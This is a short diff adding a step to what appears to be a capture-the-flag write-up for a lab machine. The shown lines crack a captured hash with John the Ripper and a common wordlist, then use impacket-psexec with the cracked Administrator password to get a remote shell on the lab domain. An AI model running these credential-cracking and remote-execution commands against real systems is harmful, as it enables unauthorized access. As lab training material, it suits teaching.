@@ -32,3 +32,6 @@ Following command can be use to crack the obatined hash:
 
 john --wordlist=/usr/share/wordlists/rockyou.txt admin.txt
 
+Following command can be use to logib with username and pasword
+
+impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
